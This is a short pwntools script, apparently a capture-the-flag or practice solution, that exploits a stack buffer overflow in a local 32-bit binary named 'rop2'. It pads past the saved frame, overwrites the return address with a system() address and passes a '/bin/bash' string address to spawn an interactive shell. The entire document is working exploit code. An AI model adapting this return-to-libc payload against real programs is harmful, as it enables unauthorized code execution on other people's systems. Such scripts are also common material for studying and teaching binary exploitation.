from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

p = process('./rop2')

gdb.attach(p)

system = p32(0x80483a0)
binbash = p32(0x8049610)

payload = 'a'*0x88 + 'b'*4 
payload += system
payload += 'c'*4
payload += binbash

p.sendline(payload)
#p.recv()


p.interactive()
